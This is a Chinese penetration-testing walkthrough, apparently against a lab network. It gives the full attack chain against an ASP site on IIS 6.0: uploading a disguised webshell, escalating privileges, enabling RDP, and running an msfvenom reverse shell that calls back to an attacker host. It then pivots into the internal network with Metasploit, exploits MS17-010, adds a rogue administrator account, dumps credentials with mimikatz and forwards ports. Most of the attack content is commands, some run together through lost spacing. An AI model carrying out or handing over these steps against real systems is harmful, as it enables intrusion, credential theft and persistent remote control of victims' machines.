0x00 漏洞发现

拿到一个网站：http://192.168.43.130:8083/index.asp

发现为asp。

指纹识别：

目录扫描：

后台为admin。

访问后台，

发现后台存在信息泄露，用户名和密码都已经写出来了。

进入到网站后台，发现有很多可利用的点。如修改配置，数据库备份，存在上传点。

0x01 漏洞利用

1、找到上传点，上传脚本格式的文件，提示只能上传gif/jpg/bmp等格式。

2、找到上传点，上传一个一句话木马图片。

3、根据上传成功之后的路径确定是否上传，图片马上传成功。

4、这时，我们使用数据库备份的功能，将图片格式的文件备份为脚本格式的文件。

5、可以看到备份为了aa.asp.asa的格式，在iis6.0下asa格式可以被解析为asp格式。

6、访问备份的文件，可以看到已经被解析了。

7、使用菜刀成功连接。

0x02 提权

上传大马，执行cmd命令拒绝访问。

点击磁盘权限，找到无空格可读写目录为c:\wmpub\

上传cmd.exe  c:\wmpub\1.cmd

执行whoami命令

使用systeminfo查看补丁只有一个：[01]: Q147222

使用提权补丁对比工具，pr，巴西烤肉都可以用。

这里我使用巴西烤肉，先上传。

c:\wmpub\1.txt

执行ipconfig和whoami命令，whoami为system权限。

内网地址为192.168.206.3

开启3389远程连接。

c:\wmpub\1.txt "REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal\"\"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"

cmd输入mstsc，连接3389，

0x03 探测内网

一、上传scan-port.exe开始内网扫描

192.168.206.5主机开启445，使用msf测试一下是否存在永恒之蓝ms17-010.

二、已经知道了www服务器的内网IP地址，也确定了存在内网，那么下一步为了方便，开始制作msf后门程序反弹一个shell给msf，以www服务器为跳板对内网就行进一步的探索与发现


这里使用msfvenom制作木马后门程序反弹shell给msf并在msf中开启监听（如果对方www服务器存在安全软件，就要考虑相应的免杀操作）

MSF生成exe

msfvenom -p windows/meterpreter/reverse_tcplhost=192.168.43.8 lport=4444 -f exe -o msf.exe

菜刀上传msf.exe

设置msf监听，

use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.43.8set LPORT 3333exploit

在大马执行命令运行msf.exe，可以看到kali已经监听了。

c:\wmpub\1.txt "C:\Inetpub\wwwroot\nanfeng\msf.exe"

Getuid查看当前用户

MSF 路由添加帮助查询命令如下：run autoroute -h获取目标内网地址段：runget_local_subnets添加路由run autoroute -s 192.168.206.0/24run autoroute -p

使用arp_scanner模块扫描探测内网存活主机

run arp_scanner -r 192.168.206.0/24

Background后台隐藏。

Msf端口扫描
use auxiliary/scanner/portscan/tcpset rhosts 192.168.206.5set ports 443-446set threads 100run

PS：注意这里不能直接使用Nmap进行信息收集，因为上文的msf路由只是作用于msf上下文，而不是整个主机上的应用。那么怎么样才能正常使用主机上的nmap呢，这里就需要在msf中利用辅助模块开启socks代理并设置proxychains。

知道了内网主机开启了445端口，那么使用永恒之蓝漏洞ms17-010对其进行探测是否存在相应漏洞。

0x04 攻击内网：

Msf测试是否存在ms17-010search ms17_010use auxiliary/scanner/smb/smb_ms17_010set RHOSTS 192.168.206.5run

存在漏洞。


在实际使用msf的ms17_010_eternalblue模块时，有几个弊端。

1.session 很容易died  

2.ms17_010_eternalblue模块利用起来非常耗时

3.无法利用成功


拿shell

search ms17_010use exploit/windows/smb/ms17_010_psexecshow optionsset RHOST 192.168.206.5set payload windows/x64/meterpreter/bind_tcpset smbuser testset smbpass testset smbdomain 192.168.206.5run

可以看到永恒之蓝漏洞利用成功，查看系统权限、IP等信息

加载第三方模块mimikatz抓取系统账户信息：未抓取到普通用户

kerbores

关闭内网主机防火墙、添加管理员、开启3389

输入shell进入命令行交互界面

whoaminet user aaa aaa /addnet localgroup administrators aaa /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal""Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

使用meterpreter中端口映射工具portfwd将内网主机3389端口映射出去，使得外网主机可以远程控制内网主机

portfwdadd -l 2222 -p 3389 -r 192.168.206.5portfwd listportfwd flush 清除建立的映射规则 list查看规则

连接内网主机的3389。
